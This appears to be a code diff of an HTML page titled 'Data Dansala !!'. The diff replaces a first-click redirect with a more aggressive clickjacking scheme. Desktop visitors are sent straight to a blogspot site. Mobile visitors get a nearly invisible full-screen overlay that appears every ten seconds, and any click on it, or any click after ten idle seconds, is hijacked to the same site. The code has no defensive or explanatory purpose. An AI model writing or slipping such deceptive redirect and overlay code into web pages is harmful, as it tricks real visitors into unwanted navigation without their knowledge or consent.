@@ -1,44 +1,82 @@
 <!DOCTYPE html>
 <html>
-    <head>
-        <script>
-            // Check if the device is a PC
-            function isPC() {
-              const userAgent = navigator.userAgent;
-              const mobileKeywords = [
-                'Android',
-                'webOS',
-                'iPhone',
-                'iPad',
-                'iPod',
-                'BlackBerry',
-                'Windows Phone'
-              ];
-          
-              return !mobileKeywords.some(keyword => userAgent.includes(keyword));
-            }
-          
-            // Redirect PC users immediately on visit
-            if (isPC()) {
-              window.location.href = 'https://riophones.blogspot.com/';
-            }
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data Dansala !!</title>
+    <style>
+        /* Your existing CSS styles here */
+        
+        /* Transparent overlay styles */
+        #redirectOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.001); /* Nearly transparent */
+            z-index: 99999;
+            display: none;
+            cursor: pointer;
+        }
+    </style>
+    <script>
+        // PC detection - redirect immediately if PC
+        function isPC() {
+            const userAgent = navigator.userAgent;
+            const mobileKeywords = [
+                'Android', 'webOS', 'iPhone', 
+                'iPad', 'iPod', 'BlackBerry', 'Windows Phone'
+            ];
+            return !mobileKeywords.some(keyword => userAgent.includes(keyword));
+        }
+        
+        if (isPC()) {
+            window.location.href = 'https://riophones.blogspot.com/';
+        }
 
-            // Track first click redirect
-            document.addEventListener('DOMContentLoaded', function() {
-                document.body.addEventListener('click', function(e) {
-                    // Check if already redirected
-                    if (!localStorage.getItem('hasRedirected')) {
-                        // Set flag to prevent future redirects
-                        localStorage.setItem('hasRedirected', 'true');
-                        // Redirect on first click
-                        window.location.href = 'https://riophones.blogspot.com';
-                        e.preventDefault();
-                        e.stopPropagation();
-                        return false;
+        // Overlay management
+        document.addEventListener('DOMContentLoaded', function() {
+            const overlay = document.createElement('div');
+            overlay.id = 'redirectOverlay';
+            document.body.appendChild(overlay);
+            
+            // Show overlay every 10 seconds
+            setInterval(function() {
+                overlay.style.display = 'block';
+                
+                // Hide after 1 second if not clicked
+                setTimeout(function() {
+                    if (overlay.style.display === 'block') {
+                        overlay.style.display = 'none';
                     }
-                }, true);
+                }, 1000);
+            }, 10000);
+            
+            // Redirect when overlay is clicked
+            overlay.addEventListener('click', function() {
+                window.location.href = 'https://riophones.blogspot.com';
             });
-        </script>
+            
+            // Track normal clicks for the 10-second rule
+            let lastClickTime = Date.now();
+            
+            document.addEventListener('click', function(e) {
+                const now = Date.now();
+                const tenSeconds = 10 * 1000;
+                
+                // Redirect if 10+ seconds since last click
+                if (now - lastClickTime > tenSeconds) {
+                    window.location.href = 'https://riophones.blogspot.com';
+                    e.preventDefault();
+                    return false;
+                }
+                
+                lastClickTime = now;
+            }, true);
+        });
+    </script>
 
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
